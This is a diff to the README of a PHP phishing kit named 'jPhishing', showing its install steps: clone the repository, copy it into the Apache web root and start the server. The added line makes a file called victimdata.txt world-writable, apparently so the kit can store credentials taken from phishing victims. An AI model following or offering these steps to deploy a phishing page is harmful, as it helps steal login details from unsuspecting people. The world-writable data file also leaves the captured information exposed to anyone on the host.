@@ -5,6 +5,7 @@ Simple Phishing using PHP without database
 ```
 $ git clone https://github.com/j3ssie/jPhishing.git
 $ cp jPhishing/* /var/www/html/
+$ chmod 777 /var/www/html/victimdata.txt
 $ service apache2 start
 ```
 ## Usage
